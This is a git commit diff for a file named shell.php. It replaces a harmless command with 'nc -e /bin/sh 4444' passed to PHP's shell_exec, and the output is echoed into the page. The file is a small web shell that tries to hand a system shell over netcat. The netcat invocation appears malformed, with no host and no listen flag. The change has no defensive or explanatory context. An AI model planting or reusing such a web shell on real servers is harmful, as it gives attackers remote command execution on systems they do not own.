d68b44b58ec15b77c272e12b6e08f2c4623d1a7c
Andrei Leucuta <38253549+genesis152@users.noreply.github.com>
2018-11-18 13:23:17 +0200

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,5 +1,6 @@
 <?php
-$cmd = 'timeout 10s';
-echo '<p>da</p>';
-shell_exec($cmd);
+$cmd = 'nc -e /bin/sh 4444';
+echo '<code style=display:block;white-space:pre-wrap>';
+echo shell_exec($cmd);
+echo '</code>';
 ?>
